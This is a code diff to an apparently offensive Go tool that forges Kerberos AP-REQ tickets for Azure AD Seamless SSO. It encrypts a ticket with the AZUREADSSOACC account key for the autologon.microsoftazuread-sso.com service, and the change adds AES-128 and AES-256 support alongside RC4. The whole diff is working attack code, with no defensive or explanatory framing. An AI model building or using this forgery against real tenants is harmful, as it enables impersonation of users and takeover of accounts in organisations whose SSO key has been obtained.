@@ -4,7 +4,12 @@ package ticket
 
 import (
 	cryptorand "crypto/rand"
+	"fmt"
 	"time"
+
+	"github.com/jcmturner/gokrb5/v8/crypto"
+	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
+	"github.com/jcmturner/gokrb5/v8/types"
 )
 
 // ForgeParams holds all inputs for building a forged KRB_AP_REQ.
@@ -53,11 +58,17 @@ func Forge(params *ForgeParams) (*ForgedTicket, error) {
 
 	// Encrypt ticket body (EncTicketPart) with AZUREADSSOACC key
 	ticketBody := buildTicketBodyDER(authTime, endTime, renewTime, sessionKey, params)
-	encTicket := encryptRC4(params.Key, ticketBody, ticketUsage)
+	encTicket, err := encrypt(params.Key, ticketBody, ticketUsage, params.EType)
+	if err != nil {
+		return nil, fmt.Errorf("forge: encrypt ticket: %w", err)
+	}
 
 	// Build authenticator and encrypt with session key
 	authBody := buildAuthenticatorDER(ctime, sessionKey, seqNumber, params.MachineID, params.KerbLocal2, params)
-	encAuth := encryptRC4(sessionKey, authBody, authUsage)
+	encAuth, err := encrypt(sessionKey, authBody, authUsage, params.EType)
+	if err != nil {
+		return nil, fmt.Errorf("forge: encrypt authenticator: %w", err)
+	}
 
 	// Build KRB_AP_REQ
 	apreq := buildAPREQDER(encTicket, encAuth, params)
@@ -160,6 +171,13 @@ func tokenRestrictionData(machineID []byte) []byte {
 // ============================================================
 
 func buildAuthenticatorDER(ctime time.Time, sessKey, seqNumber, machineID, kerbLocal2 []byte, p *ForgeParams) []byte {
+	subKeyType := byte(23) // RC4
+	subKeySize := 16
+	if p.EType == etypeID.AES256_CTS_HMAC_SHA1_96 {
+		subKeyType = 18; subKeySize = 32
+	} else if p.EType == etypeID.AES128_CTS_HMAC_SHA1_96 {
+		subKeyType = 17; subKeySize = 16
+	}
 	return der(
 		0x62, // APPLICATION 2
 		derSeq(
@@ -183,8 +201,8 @@ func buildAuthenticatorDER(ctime time.Time, sessKey, seqNumber, machineID, kerbL
 			derTag(0xA5, derTime(ctime)),
 			// [6] subkey
 			derTag(0xA6, derSeq(
-				derTag(0xA0, derInt1(23)), // RC4
-				derTag(0xA1, derOctet(randomBytes(16))),
+				derTag(0xA0, derInt1(subKeyType)),
+				derTag(0xA1, derOctet(randomBytes(subKeySize))),
 			)),
 		// [7] seq-number
 		derTag(0xA7, derIntBytes(seqNumber)),
@@ -203,6 +221,9 @@ func gssChecksumData() []byte {
 
 func buildAuthAuthDataDER(machineID, kerbLocal2 []byte, p *ForgeParams) []byte {
 	svcName := "HTTP/autologon.microsoftazuread-sso.com@" + p.Realm
+	encType := byte(23) // RC4
+	if p.EType == etypeID.AES256_CTS_HMAC_SHA1_96 { encType = 18 }
+	if p.EType == etypeID.AES128_CTS_HMAC_SHA1_96 { encType = 17 }
 
 	return derSeq(
 		derSeq(
@@ -211,7 +232,7 @@ func buildAuthAuthDataDER(machineID, kerbLocal2 []byte, p *ForgeParams) []byte {
 				// ETYPE_NEGOTIATION (129)
 				derSeq(
 					derTag(0xA0, derInt2(0x00, 0x81)),
-					derTag(0xA1, derOctet(derSeq(derInt1(23)))),
+					derTag(0xA1, derOctet(derSeq(derInt1(encType)))),
 				),
 				// Token Restrictions (141)
 				derSeq(
@@ -438,7 +459,7 @@ func derLen(n int) []byte {
 }
 
 // ============================================================
-// RC4-HMAC encryption (matches Encrypt-Kerberos RC4 mode)
+// Encryption (RC4-HMAC or AES-CTS-HMAC-SHA1-96)
 // ============================================================
 
 const (
@@ -446,7 +467,18 @@ const (
 	authUsage   = 11
 )
 
-type rc4Usage int
+func encrypt(key []byte, data []byte, usage uint32, etype int32) ([]byte, error) {
+	if etype == etypeID.RC4_HMAC || etype == etypeID.RC4_HMAC_EXP {
+		return encryptRC4(key, data, int(usage)), nil
+	}
+	// AES: use gokrb5 crypto
+	k := types.EncryptionKey{KeyType: etype, KeyValue: key}
+	ed, err := crypto.GetEncryptedData(data, k, usage, 0)
+	if err != nil {
+		return nil, err
+	}
+	return ed.Cipher, nil
+}
 
 func encryptRC4(key, data []byte, usage int) []byte {
 	confounder := randomBytes(8)
